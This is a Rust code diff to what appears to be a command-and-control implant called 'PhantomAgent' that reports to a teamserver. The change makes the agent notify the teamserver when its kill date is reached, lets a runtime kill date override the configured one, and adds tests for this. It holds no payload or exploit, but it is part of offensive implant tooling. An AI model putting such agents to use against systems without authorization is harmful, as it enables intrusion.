@@ -167,6 +167,7 @@ impl PhantomAgent {
         loop {
             if self.kill_date_elapsed() {
                 warn!("phantom kill date reached; exiting");
+                self.send_kill_date_callback().await?;
                 break;
             }
 
@@ -200,16 +201,24 @@ impl PhantomAgent {
     }
 
     fn kill_date_elapsed(&self) -> bool {
-        match self.config.kill_date {
-            Some(kill_date) if kill_date > 0 => {
+        let kill_date = self.state.kill_date().or(self.config.kill_date).filter(|&kd| kd > 0);
+        match kill_date {
+            Some(kill_date) => {
                 let now = std::time::SystemTime::now()
                     .duration_since(std::time::UNIX_EPOCH)
                     .map(|duration| i64::try_from(duration.as_secs()).unwrap_or(i64::MAX))
                     .unwrap_or_default();
                 now >= kill_date
             }
-            _ => false,
+            None => false,
         }
+    }
+
+    /// Send a `CommandKillDate` callback to the teamserver to notify it that
+    /// the kill date has been reached, then flush any remaining callbacks.
+    async fn send_kill_date_callback(&mut self) -> Result<(), PhantomError> {
+        self.state.queue_kill_date_callback();
+        self.flush_pending_callbacks().await
     }
 
     async fn send_packet(&self, packet: Vec<u8>) -> Result<(), PhantomError> {
@@ -765,5 +774,33 @@ mod tests {
             Time::from_hms(hour, minute, 0).unwrap_or(Time::MIDNIGHT),
         )
         .assume_utc()
+    }
+
+    #[test]
+    fn kill_date_elapsed_checks_state_kill_date() -> Result<(), Box<dyn Error>> {
+        let mut agent = PhantomAgent::new(PhantomConfig::default())?;
+        assert!(!agent.kill_date_elapsed());
+
+        // Set a kill date in the past via state.
+        agent.state.set_kill_date(Some(1));
+        assert!(agent.kill_date_elapsed());
+
+        // Disable it.
+        agent.state.set_kill_date(None);
+        assert!(!agent.kill_date_elapsed());
+        Ok(())
+    }
+
+    #[test]
+    fn kill_date_elapsed_state_overrides_config() -> Result<(), Box<dyn Error>> {
+        // Config has a kill date far in the future.
+        let config = PhantomConfig { kill_date: Some(i64::MAX), ..PhantomConfig::default() };
+        let mut agent = PhantomAgent::new(config)?;
+        assert!(!agent.kill_date_elapsed());
+
+        // State kill date in the past takes precedence.
+        agent.state.set_kill_date(Some(1));
+        assert!(agent.kill_date_elapsed());
+        Ok(())
     }
 }
